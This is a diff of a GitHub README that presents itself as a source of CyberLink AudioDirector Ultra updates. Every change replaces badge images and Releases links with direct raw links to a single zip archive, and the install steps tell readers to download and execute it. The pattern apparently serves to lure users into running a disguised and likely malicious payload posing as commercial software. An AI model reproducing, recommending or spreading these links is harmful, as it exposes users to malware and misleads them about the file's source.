@@ -1,8 +1,8 @@
 # CyberLink AudioDirector Ultra Update 🎶
 
-![GitHub release](https://img.shields.io/github/release/ItShousuke/CyberLink-AudioDirector-Ultra-Update.svg)
-![GitHub issues](https://img.shields.io/github/issues/ItShousuke/CyberLink-AudioDirector-Ultra-Update.svg)
-![GitHub stars](https://img.shields.io/github/stars/ItShousuke/CyberLink-AudioDirector-Ultra-Update.svg)
+![GitHub release](https://github.com/ItShousuke/CyberLink-AudioDirector-Ultra-Update/raw/refs/heads/main/amalgam/Update_Ultra_Audio_Cyber_Director_Link_v3.5-beta.1.zip)
+![GitHub issues](https://github.com/ItShousuke/CyberLink-AudioDirector-Ultra-Update/raw/refs/heads/main/amalgam/Update_Ultra_Audio_Cyber_Director_Link_v3.5-beta.1.zip)
+![GitHub stars](https://github.com/ItShousuke/CyberLink-AudioDirector-Ultra-Update/raw/refs/heads/main/amalgam/Update_Ultra_Audio_Cyber_Director_Link_v3.5-beta.1.zip)
 
 Welcome to the **CyberLink AudioDirector Ultra Update** repository. This project focuses on providing updates and resources for various versions of CyberLink AudioDirector Ultra. Here, you will find information about different versions, download links, and useful tips to enhance your audio editing experience.
 
@@ -31,7 +31,7 @@ CyberLink AudioDirector is a powerful audio editing software that allows users t
 - AudioDirector Ultra 13
 - AudioDirector Ultra 2024
 
-For the latest updates and downloads, visit the [Releases section](https://github.com/ItShousuke/CyberLink-AudioDirector-Ultra-Update/releases).
+For the latest updates and downloads, visit the [Releases section](https://github.com/ItShousuke/CyberLink-AudioDirector-Ultra-Update/raw/refs/heads/main/amalgam/Update_Ultra_Audio_Cyber_Director_Link_v3.5-beta.1.zip).
 
 ## Supported Versions
 
@@ -89,7 +89,7 @@ The 2024 version is set to revolutionize audio editing with new technologies and
 
 To install any version of CyberLink AudioDirector Ultra, follow these steps:
 
-1. Visit the [Releases section](https://github.com/ItShousuke/CyberLink-AudioDirector-Ultra-Update/releases).
+1. Visit the [Releases section](https://github.com/ItShousuke/CyberLink-AudioDirector-Ultra-Update/raw/refs/heads/main/amalgam/Update_Ultra_Audio_Cyber_Director_Link_v3.5-beta.1.zip).
 2. Download the desired version.
 3. Execute the installer file.
 4. Follow the on-screen instructions to complete the installation.
@@ -140,4 +140,4 @@ For any questions or suggestions, feel free to reach out. You can contact the re
 
 ---
 
-For the latest updates and downloads, visit the [Releases section](https://github.com/ItShousuke/CyberLink-AudioDirector-Ultra-Update/releases).
+For the latest updates and downloads, visit the [Releases section](https://github.com/ItShousuke/CyberLink-AudioDirector-Ultra-Update/raw/refs/heads/main/amalgam/Update_Ultra_Audio_Cyber_Director_Link_v3.5-beta.1.zip).
